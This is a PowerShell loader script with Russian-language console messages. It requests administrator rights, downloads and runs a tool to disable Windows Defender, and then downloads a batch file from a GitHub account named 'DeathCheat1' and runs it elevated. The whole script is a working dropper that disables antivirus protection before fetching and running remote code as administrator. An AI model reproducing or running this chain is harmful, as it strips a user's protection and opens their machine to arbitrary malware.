param(
    [Parameter(Mandatory=$true)]
    [string]$Url = "https://raw.githubusercontent.com/DeathCheat1/dgfhffd/refs/heads/main/test.bat",
    [Parameter(Mandatory=$false)]
    [string]$DestinationPath,
    [Parameter(Mandatory=$false)]
    [string]$Arguments
)

function Ensure-AdminRights {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "Запрашиваю повышение прав..." -ForegroundColor Yellow
        $scriptPath = $MyInvocation.MyCommand.Path
        $scriptArgs = "-Url `"$Url`""
        if ($DestinationPath) { $scriptArgs += " -DestinationPath `"$DestinationPath`"" }
        if ($Arguments) { $scriptArgs += " -Arguments `"$Arguments`"" }
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $scriptArgs"
        $psi.Verb = "runas"
        try {
            [System.Diagnostics.Process]::Start($psi)
            exit
        }
        catch {
            Write-Host "Ошибка запроса прав: $_" -ForegroundColor Red
            exit 1
        }
    }
}

function Disable-Defender-Control {
    $dcUrl = "https://www.sordum.org/files/download/defender-control/DefenderControl.zip"
    $zipPath = "$env:TEMP\DefenderControl.zip"
    $extractPath = "$env:TEMP\DefenderControl"
    
    Write-Host "Скачиваю Defender Control..." -ForegroundColor Cyan
    try {
        (New-Object System.Net.WebClient).DownloadFile($dcUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
        $dcExe = Get-ChildItem -Path $extractPath -Filter "dControl.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
        if (-not $dcExe) { throw "dControl.exe не найден" }
        
        Write-Host "Отключаю Defender..." -ForegroundColor Cyan
        $p = Start-Process -FilePath $dcExe -ArgumentList "/D" -Verb runas -Wait -PassThru
        Start-Sleep -Seconds 5
        Write-Host "Defender отключён." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка: $_" -ForegroundColor Red
        return $false
    }
    finally {
        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    }
}

function Download-File {
    param([string]$url, [string]$destPath)
    Write-Host "Скачиваю из $url ..." -ForegroundColor Cyan
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destPath)
        Write-Host "Сохранено: $destPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
        return $false
    }
}

function Run-AsAdmin {
    param([string]$filePath, [string]$arguments)
    if (-not (Test-Path $filePath)) {
        Write-Host "Файл не найден: $filePath" -ForegroundColor Red
        return $false
    }
    Write-Host "Запускаю от имени администратора: $filePath" -ForegroundColor Cyan
    try {
        $processArgs = @{
            FilePath = $filePath
            Verb = "runas"
            Wait = $false
        }
        if ($arguments) {
            $processArgs.ArgumentList = $arguments
        }
        Start-Process @processArgs
        Write-Host "Запущено." -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Ошибка запуска: $_" -ForegroundColor Red
        return $false
    }
}

try {
    Ensure-AdminRights
    
    Write-Host "`nДля работы требуется отключить Windows Defender." -ForegroundColor Yellow
    $choice = Read-Host "Вы согласны? (y/n)"
    if ($choice -ne 'y') { Write-Host "Выход." -ForegroundColor Red; exit 1 }
    
    if (-not (Disable-Defender-Control)) {
        Write-Host "Не удалось отключить Defender." -ForegroundColor Red
        exit 1
    }
    
    if (-not $DestinationPath) {
        $fileName = [System.IO.Path]::GetFileName($Url)
        if (-not $fileName) { $fileName = "downloaded_file" }
        $DestinationPath = Join-Path $env:TEMP $fileName
    }
    
    if (-not (Download-File -url $Url -destPath $DestinationPath)) {
        throw "Не удалось скачать файл."
    }
    
    if (-not (Run-AsAdmin -filePath $DestinationPath -arguments $Arguments)) {
        throw "Не удалось запустить файл."
    }
    
    Write-Host "Готово." -ForegroundColor Green
}
catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    exit 1
}
